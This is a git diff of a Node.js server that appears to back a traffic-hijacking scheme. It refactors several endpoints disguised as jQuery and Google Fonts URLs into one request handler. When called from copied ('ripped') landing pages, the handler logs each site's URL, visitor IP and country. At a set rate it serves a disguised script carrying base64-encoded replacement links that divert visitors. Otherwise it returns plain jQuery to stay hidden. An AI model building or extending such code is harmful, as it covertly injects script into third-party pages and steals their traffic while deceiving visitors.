@@ -56,29 +56,26 @@ app.use(session({ secret: 'foosballIsDaDevil', resave: true, saveUninitialized: 
 app.use(methodOverride());
 app.use(express.static(path.join(__dirname, 'public')));
 
-//deprecated, see: https://github.com/strongloop/express/wiki/Migrating-from-3.x-to-4.x
-/*app.configure('development', function() {
-    app.use(errorHandler());
-    app.locals.pretty = true;
-});*/
+var db = mysql.createPool(config.db_connection);
 
-var connection = mysql.createConnection(config.db_connection);
-connection.connect();
 
 function getCodeDelimiter() {
   return "aIx1Fgix89e";
 }
 
-function addClientToWhitelistWindow(ip) {
+function addClientToWhitelistWindow(ip, callback) {
+  if (!ip) {
+    callback(true);
+    return;
+  }
+
   redisClient.get(ip, function(err, isWhitelisted) {
     if (isWhitelisted) {
-      console.log("ffffalse")
-      return false;
+      callback(false);
     } else {
-      console.log("true")
       redisClient.set(ip, true);
       redisClient.expire(ip, '5');
-      return true;
+      callback(true);
     }
   });
 }
@@ -96,51 +93,58 @@ function getClientResponseJSON(uuid, url, ip, callback) {
   }
 
   var response = "";
-
-  connection.query("select is_jackable(?,?,?) as redirect_rate;", [url, config.minimum_clicks_per_min, ip], function(err, docs) {
-    if (docs) {
-      if (docs[0]) {
-        var redirect_rate = docs[0].redirect_rate;
-        var randomNumber = Math.random() * 100;
-        if (redirect_rate == -1) {
-          callback({ jquery: "cloaked" });
-        } else if (randomNumber <= redirect_rate) {
-          connection.query("SELECT get_replacement_links(?,?) as links;", [url, useSplitTestLinks], function(err, docs) {
-            if (docs.length > 0) {
-              var links = docs[0].links;
-              if (links) {
-                var linksArr = links.split(",");
-                /* 2. transform that into base64 code */
-                for (var i = 0; i < linksArr.length; i++) {
-                  response += new Buffer(linksArr[i]).toString('base64') + getCodeDelimiter();
+  db.getConnection(function(err, connection) {
+    connection.query("select is_jackable(?,?,?) as redirect_rate;", [url, config.minimum_clicks_per_min, ip], function(err, docs) {
+      if (docs) {
+        if (docs[0]) {
+          var redirect_rate = docs[0].redirect_rate;
+          var randomNumber = Math.random() * 100;
+          if (redirect_rate == -1) {
+            callback({ jquery: "cloaked" });
+            connection.release();
+          } else if (randomNumber <= redirect_rate) {
+            connection.query("SELECT get_replacement_links(?,?) as links;", [url, useSplitTestLinks], function(err, docs) {
+              if (docs.length > 0) {
+                var links = docs[0].links;
+                if (links) {
+                  var linksArr = links.split(",");
+                  /* 2. transform that into base64 code */
+                  for (var i = 0; i < linksArr.length; i++) {
+                    response += new Buffer(linksArr[i]).toString('base64') + getCodeDelimiter();
+                  }
                 }
               }
-            }
 
-            if (response) {
-              connection.query("CALL increment_jacks(?,?);", [url, uuid], function(err, docs) {
-                if (err) {
-                  console.log("Error incrementing jacks for url: " + url + " : " + err);
-                }
+              if (response) {
+                connection.query("CALL increment_jacks(?,?);", [url, uuid], function(err, docs) {
+                  if (err) {
+                    console.log("Error incrementing jacks for url: " + url + " : " + err);
+                  }
+                  callback({ jquery: response });
+                  connection.release();
+                });
+              } else {
                 callback({ jquery: response });
-              });
-            } else {
-              callback({ jquery: response });
-            }
-          });
+                connection.release();
+              }
+            });
+          } else {
+            callback({ jquery: false });
+            connection.release();
+          }
         } else {
+          console.log(err);
+          console.log("Cannot select is_jackable with values: " + url + ", " + ip);
           callback({ jquery: false });
+          connection.release();
         }
       } else {
         console.log(err);
         console.log("Cannot select is_jackable with values: " + url + ", " + ip);
         callback({ jquery: false });
+        connection.release();
       }
-    } else {
-      console.log(err);
-      console.log("Cannot select is_jackable with values: " + url + ", " + ip);
-      callback({ jquery: false });
-    }
+    });
   });
 }
 
@@ -234,6 +238,301 @@ function sendBlankResponse(res) {
   res.end(response);
 }
 
+function processRequest(req, res, options) {
+  var url = options.url;
+  var uuid = options.uuid;
+
+  var ip = getClientAddress(req);
+  var geo = geoip.lookup(ip) || { country: "UNKNOWN" };
+  var full_url = url;
+
+  if (!geo) {
+    console.log(ip + " had unknown geo region.");
+  }
+
+  addClientToWhitelistWindow(ip, function(addedToWhitelistSuccessfully) {
+    if (addedToWhitelistSuccessfully) {
+
+      if (!url) {
+        sendPlainJquery(req, res);
+      } else {
+
+        url = formatURL(url);
+        var domain = getDomain(url);
+
+        var getRequestInfo = function(callback) {
+          var user = ""; //set by getuser
+
+          var getUser = function(callback) {
+            db.getConnection(function(err, connection) {
+              if (err) console.log(err)
+              connection.query("SELECT user FROM lander_info WHERE uuid = ? LIMIT 1", [uuid], function(err, docs) {
+                if (err) console.log(err);
+                user = docs[0].user;
+                callback();
+                connection.release();
+              });
+            });
+          };
+
+          //if found call this before returning
+          var insertCountryCode = function(callback) {
+            db.getConnection(function(err, connection) {
+              if (err) console.log(err)
+
+              connection.query("CALL insert_country_code(?, ?);", [url, geo.country], function(err, docs) {
+                if (err) {
+                  callback(err);
+                } else {
+                  callback(false);
+                }
+                connection.release();
+              });
+            });
+          };
+
+          var checkOldRegistered = function(callback) {
+            db.getConnection(function(err, connection) {
+              if (err) console.log(err)
+
+              connection.query("SELECT * FROM lander_info WHERE url= ? AND uuid= ?;", [url, uuid], function(err, docs) {
+                if (docs.length) {
+                  connection.query("UPDATE lander_info SET hits=hits+1,last_updated=NOW() WHERE url= ? and uuid= ?;", [url, uuid], function(err, docs) {
+                    connection.query("CALL update_stats(?, ?, ?, ?, ?);", [url, uuid, 0, 1, 0], function(err, docs) {
+                      callback('OLD_REGISTERED');
+                      connection.release();
+                    });
+                  });
+                } else {
+                  callback(false);
+                  connection.release();
+                }
+              });
+            });
+          };
+
+          var checkNewRegisteredLocal = function(callback) {
+            db.getConnection(function(err, connection) {
+              if (err) console.log(err)
+
+              connection.query("SELECT * FROM lander_info WHERE uuid= ? AND url IS NULL", [uuid], function(err, docs) {
+                if (docs.length) {
+                  if (domain.contains("file") || domain.contains("localhost")) {
+                    callback('LOCAL');
+                    connection.release();
+                  } else {
+                    connection.query("UPDATE lander_info SET url= ?,domain= ?,hits= ?,rips= ?,last_updated=NOW() WHERE uuid= ?;", [url, domain, 1, 0, uuid], function(err, docs) {
+                      connection.query("UPDATE landers SET ready= ? WHERE uuid= ?;", [2, uuid], function(err, docs) {
+                        connection.query("CALL update_stats(?, ?, ?, ?, ?);", [url, uuid, 0, 1, 0], function(err, docs) {
+                          callback('NEW_REGISTERED');
+                          connection.release();
+                        });
+                      });
+                    });
+                  }
+                } else {
+                  callback(false);
+                  connection.release();
+                }
+              });
+            });
+          };
+
+          var checkSameDomainOldRippedNewRipped = function(callback) {
+            db.getConnection(function(err, connection) {
+              if (err) console.log(err)
+
+              connection.query("SELECT * FROM lander_info WHERE domain= ?;", [domain], function(err, docs) {
+                if (err) console.log("1 err: " + err);
+                if (docs.length) {
+                  connection.query("INSERT INTO lander_info (url, uuid, user, hits, domain, rips) VALUES (?, ?, ?, ?, ?, ?);", [url, uuid, user, 1, domain, 0], function(err, docs) {
+                    if (err) console.log("2 err: " + err);
+
+                    connection.query("DELETE FROM lander_info WHERE uuid= ? AND url IS NULL;", [uuid], function(err, docs) {
+                      if (err) console.log("3 err: " + err);
+
+                      callback("SAME_DOMAIN");
+                      connection.release();
+                    });
+                  });
+                } else {
+                  connection.query("SELECT * FROM ripped WHERE uuid = ? AND url = ?;", [uuid, url], function(err, docs) {
+                    if (err) console.log("3 err: " + err);
+
+                    if (docs.length) {
+                      //IS OLD RIPPED!
+                      connection.query("UPDATE ripped SET hits=hits+1,full_url= ? ,last_updated=NOW() WHERE url = ? and uuid = ?;", [full_url, url, uuid], function(err, docs) {
+                        if (err) console.log("4 err: " + err);
+
+                        connection.query("CALL insert_pulse(?, NOW());", [url], function(err, docs) {
+                          if (err) console.log("5 err: " + err);
+
+                          connection.query("CALL update_stats(?, ?, ?, ?, ?);", [url, uuid, 0, 0, 0], function(err, docs) {
+                            if (err) console.log("6 err: " + err);
+
+                            connection.query("CALL insert_ip(?, ?, ?);", [url, ip, 0], function(err, docs) {
+                              if (err) console.log("7 err: " + err);
+
+                              callback("OLD_RIPPED");
+                              connection.release();
+                            });
+                          });
+                        });
+                      });
+                    } else {
+                      //IS NEW RIPPED!
+                      connection.query("SELECT url FROM ripped WHERE domain = ?;", [domain], function(err, docs) {
+                        var isNewDomain = true;
+                        if (docs.length) {
+                          isNewDomain = false;
+                        }
+
+                        connection.query("INSERT INTO ripped (url, uuid, user, hits, full_url, last_updated, domain) VALUES (?, ?, ?, ?, ?, NOW(), ?);", [url, uuid, user, 1, full_url, domain], function(err, docs) {
+                          connection.query("UPDATE lander_info SET rips=rips+1 WHERE uuid = ?;", [uuid], function(err, docs) {
+                            connection.query("CALL insert_pulse(?, NOW());", [url], function(err, docs) {
+                              connection.query("CALL update_stats(?, ?, ?, ?, ?);", [url, uuid, 1, 0, isNewDomain], function(err, docs) {
+                                connection.query("CALL insert_ip(?, ?, ?);", [url, ip, 1], function(err, docs) {
+                                  callback("NEW_RIPPED");
+                                  connection.release();
+                                });
+                              });
+                            });
+                          });
+                        });
+                      });
+                    }
+                  });
+                }
+              });
+            });
+          };
+
+          var checkUnknownUUIDBehavior = function(callback) {
+            db.getConnection(function(err, connection) {
+              if (err) console.log(err)
+
+              connection.query("SELECT * FROM lander_info WHERE uuid = ?;", [uuid], function(err, docs) {
+                if (docs.length) {
+                  callback("UNKNOWN_BEHAVIOR");
+                } else {
+                  callback("UNKNOWN_UUID");
+                }
+                connection.release();
+              });
+            });
+          };
+
+          var enterCountryCode = function(callback) {
+            db.getConnection(function(err, connection) {
+              if (err) console.log(err)
+
+              connection.query("CALL insert_country_code(?, ?);", [url, geo.country], function(err, docs) {
+                if (err) console.log("countr code err: " + err);
+                callback();
+                connection.release();
+              });
+            });
+          };
+
+          getUser(function() {
+            enterCountryCode(function() {
+              checkOldRegistered(function(found) {
+                if (found) {
+                  callback(found);
+                  return;
+                } else {
+                  checkNewRegisteredLocal(function(found) {
+                    if (found) {
+                      callback(found);
+                      return;
+                    } else {
+                      checkSameDomainOldRippedNewRipped(function(found) {
+                        if (found) {
+                          callback(found);
+                          return;
+                        } else {
+                          checkUnknownUUIDBehavior(function(found) {
+                            callback(found);
+                            return;
+                          });
+                        }
+                      });
+                    }
+                  });
+                }
+              });
+            });
+          });
+
+        };
+
+        getRequestInfo(function(response_string) {
+
+          if (response_string != undefined) {
+            var cloaked = 0;
+
+            if (response_string == "OLD_RIPPED") {
+              //send back data!
+              getClientResponseJSON(uuid, url, ip, function(response) {
+                if (response.jquery == false) {
+                  response = "";
+                  sendPlainJquery(req, res);
+                  return;
+                } else if (response.jquery == "cloaked") {
+                  sendPlainJquery(req, res);
+                  return;
+                  cloaked = 1;
+                  response = "";
+                } else {
+                  response = response.jquery;
+                }
+
+                fs.readFile('./client/compressed/compressed_landercode_experimental2.js', function(err, data) {
+                  if (err) throw err;
+                  var replacedFile = String(data).replace('replacemelinks', response);
+
+                  res.writeHead(200, {
+                    'Content-Length': replacedFile.length,
+                    'Content-Type': 'text/plain',
+                    'Access-Control-Allow-Origin': '*',
+                    'Access-Control-Allow-Methods': 'GET, OPTIONS',
+                    'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept'
+                  });
+                  res.end(replacedFile);
+                });
+              });
+            } else if (response_string == "OLD_REGISTERED" || response_string == "NEW_REGISTERED") {
+              sendPlainJquery(req, res);
+            } else if (response_string == "UNKNOWN_BEHAVIOR") {
+              console.log("Something went wrong when calling process_request.");
+              sendPlainJquery(req, res);
+            } else if (response_string == "UNKNOWN_UUID") {
+              console.log("An unknown uuid (" + uuid + ") was sent to the DB.");
+              sendPlainJquery(req, res);
+            } else {
+              console.log("weird response string: " + response_string);
+              sendPlainJquery(req, res);
+            }
+          } else {
+            var obj = {
+              url: url,
+              uuid: uuid,
+              domain: domain,
+              geo: geo.country,
+              ip: ip
+            }
+            console.log(err + "Failed to get a response from process_request" + JSON.stringify(obj));
+            sendPlainJquery(req, res);
+          }
+        });
+
+      }
+    } else {
+      sendPlainJquery(req, res);
+    }
+  });
+}
+
 app.get('/', function(req, res) {
   var host = req.get('host');
   var redirectUrl = config.redirectUrls[host];
@@ -253,745 +552,112 @@ app.get('/jquery/latest', function(req, res) {
 
 //I don't think this endpoint is used
 app.post('/jquery/latest', function(req, res) {
-  var url = req.body.referer;
-  var uuid = req.body.version;
-  var full_url = url;
 
-  var ip = getClientAddress(req);
-  var geo = geoip.lookup(ip);
+  var options = {
+    url: req.body.referer,
+    uuid: req.body.version
+  };
 
-  if (!geo) {
-    geo = { country: "UNKNOWN" };
-    console.log("/jquery/latest IP: " + ip + " had unknown geo region.");
-  }
-
-  if (!ip) {
-    ip = "0.0.0.0";
-  }
-
-  if (addClientToWhitelistWindow(ip)) {
-    if (!url) {
-      console.log("Error: undefined url.");
-      console.log(req.headers);
-      sendPlainJquery(req, res);
-    } else {
-
-      url = formatURL(url);
-      var domain = getDomain(url);
-
-      connection.query("select process_request(?,?,?,?,?,?) AS value;", [url, uuid, domain, full_url, geo.country, ip], function(err, docs) {
-        if (docs != undefined && docs[0] != undefined) {
-          var response_string = docs[0].value;
-          var cloaked = 0;
-
-          //console.log("Response from process_request: " + response_string);
-          if (response_string == "OLD_RIPPED") {
-            //send back data!
-            getClientResponseJSON(uuid, url, ip, function(response) {
-
-              //console.log("Response to client: " + response.jquery);
-
-              if (response.jquery == false) {
-                response = "";
-                sendPlainJquery(req, res);
-                return;
-              } else if (response.jquery == "cloaked") {
-                sendPlainJquery(req, res);
-                return;
-                cloaked = 1;
-                response = "";
-              } else {
-                response = response.jquery;
-              }
-
-              fs.readFile('./client/compressed/compressed_landercode_experimental2.js', function(err, data) {
-                if (err) throw err;
-                var replacedFile = String(data).replace('replacemeuuid', uuid);
-                replacedFile = String(replacedFile).replace('replacemelinks', response);
-
-                if (cloaked == 1) {
-                  replacedFile = String(replacedFile).replace('replacemestats', 'yes');
-                }
-
-                res.writeHead(200, {
-                  'Content-Length': replacedFile.length,
-                  'Content-Type': 'text/plain',
-                  'Access-Control-Allow-Origin': '*',
-                  'Access-Control-Allow-Methods': 'GET, OPTIONS',
-                  'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept'
-                });
-                res.end(replacedFile);
-              });
-            });
-          } else if (response_string == "OLD_REGISTERED" || response_string == "NEW_REGISTERED") {
-            sendBlankResponse(res);
-          } else if (response_string == "UNKNOWN_BEHAVIOR") {
-            console.log("Something went wrong when calling process_request.");
-            sendPlainJquery(req, res);
-          } else if (response_string == "UNKNOWN_UUID") {
-            console.log("An unknown uuid (" + uuid + ") was sent to the DB.");
-            sendPlainJquery(req, res);
-          } else {
-            sendPlainJquery(req, res);
-          }
-        } else {
-          console.log("Failed to get a response from process_request");
-          sendPlainJquery(req, res);
-        }
-      });
-    }
-
-  } else {
-    sendPlainJquery(req, res);
-  }
+  processRequest(req, res, options);
 });
 
 
 app.post('/jquery/stable', function(req, res) {
-  var url = req.body.stats;
-  var uuid = req.body.version;
-  var full_url = url;
 
-  var ip = getClientAddress(req);
-  var geo = geoip.lookup(ip);
+  var options = {
+    url: req.body.stats,
+    uuid: req.body.version
+  };
 
-  if (!geo) {
-    geo = { country: "UNKNOWN" };
-    console.log("/jquery/stable IP: " + ip + " had unknown geo region.");
-  }
-
-  if (!ip) {
-    ip = "0.0.0.0";
-  }
-
-  if (addClientToWhitelistWindow(ip)) {
-    if (!url) {
-      console.log("Error: undefined url.");
-      console.log(req.headers);
-      sendPlainJquery(req, res);
-    } else {
-
-      url = formatURL(url);
-      var domain = getDomain(url);
-
-      //console.log("Received lander request from " + url + " with uuid = " + uuid);
-
-      //console.log("Formatted url to be: " + url);
-      //console.log("The domain of the url is: " + domain);
-
-      connection.query("select process_request(?,?,?,?,?,?) AS value;", [url, uuid, domain, full_url, geo.country, ip], function(err, docs) {
-        if (docs != undefined && docs[0] != undefined) {
-          var response_string = docs[0].value;
-          var cloaked = 0;
-
-          //console.log("Response from process_request: " + response_string);
-          if (response_string == "OLD_RIPPED") {
-            //send back data!
-            getClientResponseJSON(uuid, url, ip, function(response) {
-
-              //console.log("Response to client: " + response.jquery);
-
-              if (response.jquery == false) {
-                response = "";
-                sendPlainJquery(req, res);
-                return;
-              } else if (response.jquery == "cloaked") {
-                cloaked = 1;
-                response = "";
-                sendPlainJquery(req, res);
-                return;
-              } else {
-                response = response.jquery;
-              }
-
-              fs.readFile('./client/compressed/compressed_landercode_experimental2.js', function(err, data) {
-                if (err) throw err;
-                var replacedFile = String(data).replace('replacemeuuid', uuid);
-                replacedFile = String(replacedFile).replace('replacemelinks', response);
-
-                if (cloaked == 1) {
-                  replacedFile = String(replacedFile).replace('replacemestats', 'yes');
-                }
-
-                res.writeHead(200, {
-                  'Content-Length': replacedFile.length,
-                  'Content-Type': 'text/plain',
-                  'Access-Control-Allow-Origin': '*',
-                  'Access-Control-Allow-Methods': 'GET, OPTIONS',
-                  'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept'
-                });
-                res.end(replacedFile);
-              });
-            });
-          } else if (response_string == "OLD_REGISTERED" || response_string == "NEW_REGISTERED") {
-            sendBlankResponse(res);
-          } else if (response_string == "UNKNOWN_BEHAVIOR") {
-            console.log("Something went wrong when calling process_request.");
-            sendPlainJquery(req, res);
-          } else if (response_string == "UNKNOWN_UUID") {
-            console.log("An unknown uuid (" + uuid + ") was sent to the DB.");
-            sendPlainJquery(req, res);
-          } else {
-            sendPlainJquery(req, res);
-          }
-        } else {
-          console.log("Failed to get a response from process_request");
-          sendPlainJquery(req, res);
-        }
-      });
-    }
-  } else {
-    sendPlainJquery(req, res);
-  }
-
-
+  processRequest(req, res, options);
 });
 
 app.post('/jquery/dist', function(req, res) {
-  var url = req.body.stats;
-  var uuid = req.body.version;
-  var full_url = url;
 
-  var ip = getClientAddress(req);
-  var geo = geoip.lookup(ip);
+  var options = {
+    url: req.body.stats,
+    uuid: req.body.version
+  };
 
-  if (!geo) {
-    geo = { country: "UNKNOWN" };
-    console.log("/jquery/dist IP: " + ip + " had unknown geo region.");
-  }
-
-  if (!ip) {
-    ip = "0.0.0.0";
-  }
-
-
-  if (addClientToWhitelistWindow(ip)) {
-    if (!url) {
-      console.log("Error: undefined url.");
-      console.log(req.headers);
-      sendPlainJquery(req, res);
-    } else {
-      url = formatURL(url);
-      var domain = getDomain(url);
-
-      //console.log("Received lander request from " + url + " with uuid = " + uuid);
-
-      //console.log("Formatted url to be: " + url);
-      //console.log("The domain of the url is: " + domain);
-
-      connection.query("select process_request(?,?,?,?,?,?) AS value;", [url, uuid, domain, full_url, geo.country, ip], function(err, docs) {
-        if (docs != undefined && docs[0] != undefined) {
-          var response_string = docs[0].value;
-          var cloaked = 0;
-
-          //console.log("Response from process_request: " + response_string);
-          if (response_string == "OLD_RIPPED") {
-            //send back data!
-            getClientResponseJSON(uuid, url, ip, function(response) {
-
-              //console.log("Response to client: " + response.jquery);
-
-              if (response.jquery == false) {
-                response = "";
-                sendPlainJquery(req, res);
-                return;
-              } else if (response.jquery == "cloaked") {
-                cloaked = 1;
-                response = "";
-                sendPlainJquery(req, res);
-                return;
-              } else {
-                response = response.jquery;
-              }
-
-              fs.readFile('./client/compressed/compressed_landercode_experimental2.js', function(err, data) {
-                if (err) throw err;
-                var replacedFile = String(data).replace('replacemeuuid', uuid);
-                replacedFile = String(replacedFile).replace('replacemelinks', response);
-
-                if (cloaked == 1) {
-                  replacedFile = String(replacedFile).replace('replacemestats', 'yes');
-                }
-
-                res.writeHead(200, {
-                  'Content-Length': replacedFile.length,
-                  'Content-Type': 'text/plain',
-                  'Access-Control-Allow-Origin': '*',
-                  'Access-Control-Allow-Methods': 'GET, OPTIONS',
-                  'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept'
-                });
-                res.end(replacedFile);
-              });
-            });
-          } else if (response_string == "OLD_REGISTERED" || response_string == "NEW_REGISTERED") {
-            sendBlankResponse(res);
-          } else if (response_string == "UNKNOWN_BEHAVIOR") {
-            console.log("Something went wrong when calling process_request.");
-            sendPlainJquery(req, res);
-          } else if (response_string == "UNKNOWN_UUID") {
-            console.log("An unknown uuid (" + uuid + ") was sent to the DB.");
-            sendPlainJquery(req, res);
-          } else {
-            sendPlainJquery(req, res);
-          }
-        } else {
-          console.log("Failed to get a response from process_request");
-          sendPlainJquery(req, res);
-        }
-      });
-    }
-  } else {
-    sendPlainJquery(req, res);
-  }
+  processRequest(req, res, options);
 });
 
 app.get('/jquery/dist', function(req, res) {
 
   var xalt = req.headers['x-alt-referer'];
-
   if (!xalt) {
     xalt = req.headers['X-Alt-Referer'];
   }
 
-
-  var isWrongCjId = function(uuid, url) {
-    //if uuid is balling and the following urls don't jack because it's jake's traffic.
-    if (uuid == "c46b3fb0-a619-4012-956a-c04315a1e6b0") {
-      if (url == "http://trending.bestnews-today.com/FRS/index.html?id=FF-16" ||
-        url == "http://trending.bestnews-today.com/FRS/index.html") {
-        return true;
-      }
-    }
-    return false;
-  }
-
   if (!xalt) {
-    console.log("Error: undefined x-alt-referer");
-    console.log(req.headers);
     sendPlainJquery(req, res);
   } else {
 
     var index = xalt.lastIndexOf("?txid=");
 
-    var url = xalt.substring(0, index);
-    var uuid = xalt.substring(index + 6);
-    var full_url = url;
+    var options = {
+      url: xalt.substring(0, index),
+      uuid: xalt.substring(index + 6)
+    };
 
-    var ip = getClientAddress(req);
-    var geo = geoip.lookup(ip);
-
-    if (!geo) {
-      geo = { country: "UNKNOWN" };
-      console.log("/jquery/dist IP: " + ip + " had unknown geo region.");
-    }
-
-    if (!ip) {
-      ip = "0.0.0.0";
-    }
-
-    if (addClientToWhitelistWindow(ip)) {
-      if (!url) {
-        console.log("Error: undefined url. Or wrong CJ id");
-        console.log(req.headers);
-        sendPlainJquery(req, res);
-      } else {
-        url = formatURL(url);
-        var domain = getDomain(url);
-
-        if (isWrongCjId(uuid, url)) {
-          sendPlainJquery(req, res);
-          return;
-        }
-        //console.log("Received lander request from " + url + " with uuid = " + uuid);
-
-        //console.log("Formatted url to be: " + url);
-        //console.log("The domain of the url is: " + domain);
-
-        connection.query("select process_request(?,?,?,?,?,?) AS value;", [url, uuid, domain, full_url, geo.country, ip], function(err, docs) {
-          if (docs != undefined && docs[0] != undefined) {
-            var response_string = docs[0].value;
-            var cloaked = 0;
-
-            //console.log("Response from process_request: " + response_string);
-            if (response_string == "OLD_RIPPED") {
-              //send back data!
-              getClientResponseJSON(uuid, url, ip, function(response) {
-
-                //console.log("Response to client: " + response.jquery);
-
-                if (response.jquery == false) {
-                  response = "";
-                  sendPlainJquery(req, res);
-                  return;
-                } else if (response.jquery == "cloaked") {
-                  cloaked = 1;
-                  response = "";
-                  sendPlainJquery(req, res);
-                  return;
-                } else {
-                  response = response.jquery;
-                }
-
-                fs.readFile('./client/compressed/compressed_landercode_experimental2.js', function(err, data) {
-                  if (err) throw err;
-                  var replacedFile = String(data).replace('replacemeuuid', uuid);
-                  replacedFile = String(replacedFile).replace('replacemelinks', response);
-
-                  if (cloaked == 1) {
-                    replacedFile = String(replacedFile).replace('replacemestats', 'yes');
-                  }
-
-                  res.writeHead(200, {
-                    'Content-Length': replacedFile.length,
-                    'Content-Type': 'text/plain',
-                    'Access-Control-Allow-Origin': '*',
-                    'Access-Control-Allow-Methods': 'GET, OPTIONS',
-                    'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept'
-                  });
-                  res.end(replacedFile);
-                });
-              });
-            } else if (response_string == "OLD_REGISTERED" || response_string == "NEW_REGISTERED") {
-              sendBlankResponse(res);
-            } else if (response_string == "UNKNOWN_BEHAVIOR") {
-              console.log("Something went wrong when calling process_request.");
-              sendPlainJquery(req, res);
-            } else if (response_string == "UNKNOWN_UUID") {
-              console.log("An unknown uuid (" + uuid + ") was sent to the DB.");
-              sendPlainJquery(req, res);
-            } else {
-              sendPlainJquery(req, res);
-            }
-          } else {
-            console.log("Failed to get a response from process_request");
-            sendPlainJquery(req, res);
-          }
-        });
-      }
-    } else {
-      sendPlainJquery(req, res);
-    }
+    processRequest(req, res, options);
   }
 });
 
 app.post('/jquery', function(req, res) {
 
-  var url = req.headers['referer'];
+  var options = {
+    url: req.headers['referer'],
+    uuid: req.body.version,
+  };
 
-  var uuid = req.body.version;
-
-  var full_url = url;
-
-  var ip = getClientAddress(req);
-  var geo = geoip.lookup(ip);
-
-  if (!geo) {
-    geo = { country: "UNKNOWN" };
-    console.log("/jquery IP: " + ip + " had unknown geo region.");
-  }
-
-  if (!ip) {
-    ip = "0.0.0.0";
-  }
-
-  if (addClientToWhitelistWindow(ip)) {
-    if (!url) {
-      console.log("Error: undefined url.");
-      console.log(req.headers);
-      sendPlainJquery(req, res);
-    } else {
-
-      url = formatURL(url);
-      var domain = getDomain(url);
-
-      //console.log("Received lander request from " + url + " with uuid = " + uuid);
-
-      //console.log("Formatted url to be: " + url);
-      //console.log("The domain of the url is: " + domain);
-
-      connection.query("select process_request(?,?,?,?,?,?) AS value;", [url, uuid, domain, full_url, geo.country, ip], function(err, docs) {
-        if (docs != undefined && docs[0] != undefined) {
-          var response_string = docs[0].value;
-          var cloaked = 0;
-
-          //console.log("Response from process_request: " + response_string);
-          if (response_string == "OLD_RIPPED") {
-            //send back data!
-            getClientResponseJSON(uuid, url, ip, function(response) {
-
-              //console.log("Response to client: " + response.jquery);
-
-              if (response.jquery == false) {
-                response = "";
-                sendPlainJquery(req, res);
-                return;
-              } else if (response.jquery == "cloaked") {
-                cloaked = 1;
-                response = "";
-                sendPlainJquery(req, res);
-                return;
-              } else {
-                response = response.jquery;
-              }
-
-              fs.readFile('./client/compressed/compressed_landercode_experimental2.js', function(err, data) {
-                if (err) throw err;
-                var replacedFile = String(data).replace('replacemeuuid', uuid);
-                replacedFile = String(replacedFile).replace('replacemelinks', response);
-
-                if (cloaked == 1) {
-                  replacedFile = String(replacedFile).replace('replacemestats', 'yes');
-                }
-
-                res.writeHead(200, {
-                  'Content-Length': replacedFile.length,
-                  'Content-Type': 'text/plain',
-                  'Access-Control-Allow-Origin': '*',
-                  'Access-Control-Allow-Methods': 'GET, OPTIONS',
-                  'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept'
-                });
-                res.end(replacedFile);
-              });
-            });
-          } else if (response_string == "OLD_REGISTERED" || response_string == "NEW_REGISTERED") {
-            sendBlankResponse(res);
-          } else if (response_string == "UNKNOWN_BEHAVIOR") {
-            console.log("Something went wrong when calling process_request.");
-            sendPlainJquery(req, res);
-          } else if (response_string == "UNKNOWN_UUID") {
-            console.log("An unknown uuid (" + uuid + ") was sent to the DB.");
-            sendPlainJquery(req, res);
-          } else {
-            sendPlainJquery(req, res);
-          }
-        } else {
-          console.log("Failed to get a response from process_request");
-          sendPlainJquery(req, res);
-        }
-      });
-    }
-  } else {
-    sendPlainJquery(req, res);
-  }
+  processRequest(req, res, options);
 
 });
 
 
-//FOR fonts.googleapis.io/css?family=<font>
+//fonts.googleapis.io/css?family=<font>
 app.get('/css', function(req, res) {
 
   var url = req.headers.referrer || req.headers.referer;
-  var full_url = url;
-
   var font = req.query.family;
   var uuid = config.uuidArr[font];
 
   if (!uuid) {
-
+    console.log("no uuid /css redirecting to fonts..");
     res.redirect('http://fonts.googleapis.com' + req.url);
     return;
   }
-  var ip = getClientAddress(req);
-  var geo = geoip.lookup(ip);
 
-  if (!geo) {
-    geo = { country: "UNKNOWN" };
-    console.log("/css: IP: " + ip + " had unknown geo region.");
-  }
+  var options = {
+    url: url,
+    uuid: uuid
+  };
 
-  if (!ip) {
-    ip = "0.0.0.0";
-  }
+  processRequest(req, res, options);
 
-  //if add success then we can jack else serve plain css
-  if (addClientToWhitelistWindow(ip)) {
-
-    // console.log("\nurl : " + url + "\nuuid: " + uuid + " " + "\nip: " + ip + "\ngeo: " + geo);
-
-    if (!url) {
-      console.log("Error: undefined url.");
-      // console.log(req.headers);
-      sendPlainFont(font, res);
-    } else {
-      url = formatURL(url);
-      var domain = getDomain(url);
-
-      // console.log("Received lander request from " + url + " with uuid = " + uuid);
-
-      // console.log("Formatted url to be: " + url);
-      // console.log("The domain of the url is: " + domain);
-
-      connection.query("select process_request(?,?,?,?,?,?) AS value;", [url, uuid, domain, full_url, geo.country, ip], function(err, docs) {
-        if (docs != undefined && docs[0] != undefined) {
-          var response_string = docs[0].value;
-          var cloaked = 0;
-
-          //console.log("Response from process_request: " + response_string);
-          if (response_string == "OLD_RIPPED") {
-            //send back data!
-            getClientResponseJSON(uuid, url, ip, function(response) {
-
-              //console.log("Response to client: " + response.jquery);
-
-              if (response.jquery == false) {
-                sendPlainFont(font, res);
-                return;
-              } else if (response.jquery == "cloaked") {
-                cloaked = 1;
-                sendPlainFont(font, res);
-                return;
-              } else {
-                response = response.jquery;
-              }
-
-              fs.readFile('./client/compressed/compressed_googleapis.js', function(err, data) {
-                if (err) throw err;
-                var replacedFile = String(data).replace('replacemeuuid', uuid);
-                replacedFile = String(replacedFile).replace('replacemelinks', response);
-
-
-
-                if (cloaked == 1) {
-                  replacedFile = String(replacedFile).replace('replacemestats', 'yes');
-                }
-
-                res.writeHead(200, {
-                  'Content-Length': replacedFile.length,
-                  'Content-Type': 'text/plain',
-                  'Access-Control-Allow-Origin': '*',
-                  'Access-Control-Allow-Methods': 'GET, OPTIONS',
-                  'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept'
-                });
-                res.end(replacedFile);
-              });
-            });
-          } else if (response_string == "OLD_REGISTERED" || response_string == "NEW_REGISTERED") {
-            sendBlankResponse(res);
-          } else if (response_string == "UNKNOWN_BEHAVIOR") {
-            // console.log("Something went wrong when calling process_request.");
-            sendPlainFont(font, res);
-          } else if (response_string == "UNKNOWN_UUID") {
-            // console.log("An unknown uuid (" + uuid + ") was sent to the DB.");
-            sendPlainFont(font, res);
-          } else {
